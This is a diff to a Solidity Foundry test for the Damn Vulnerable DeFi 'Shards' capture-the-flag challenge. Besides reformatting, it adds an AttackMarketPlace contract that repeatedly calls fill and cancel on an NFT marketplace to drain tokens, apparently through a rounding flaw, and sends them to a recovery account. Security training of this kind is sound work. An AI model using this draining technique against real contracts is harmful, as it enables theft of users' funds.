@@ -3,13 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {
-    ShardsNFTMarketplace,
-    IShardsNFTMarketplace,
-    ShardsFeeVault,
-    DamnValuableToken,
-    DamnValuableNFT
-} from "../../src/shards/ShardsNFTMarketplace.sol";
+import {ShardsNFTMarketplace, IShardsNFTMarketplace, ShardsFeeVault, DamnValuableToken, DamnValuableNFT} from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract ShardsChallenge is Test {
@@ -63,8 +57,13 @@ contract ShardsChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy NFT marketplace and get the associated fee vault
-        marketplace =
-            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
+        marketplace = new ShardsNFTMarketplace(
+            nft,
+            token,
+            address(new ShardsFeeVault()),
+            oracle,
+            MARKETPLACE_INITIAL_RATE
+        );
         feeVault = marketplace.feeVault();
 
         // Deploy DVT staking contract and enable staking of fees in marketplace
@@ -114,7 +113,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new AttackMarketPlace(marketplace, token, recovery);
     }
 
     /**
@@ -126,7 +125,7 @@ contract ShardsChallenge is Test {
 
         // Marketplace has less tokens
         uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
-        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");
+        assertGt(missingTokens, (initialTokensInMarketplace * 1e16) / 100e18, "Marketplace still has tokens");
 
         // All recovered funds sent to recovery account
         assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
@@ -134,5 +133,19 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract AttackMarketPlace {
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        uint256 wantShards = 100;
+
+        // 100 shard * 10_000
+        for (uint256 i = 0; i < 10001; i++) {
+            _marketplace.fill(1, wantShards);
+            _marketplace.cancel(1, i);
+        }
+
+        _token.transfer(_recovery, _token.balanceOf(address(this)));
     }
 }
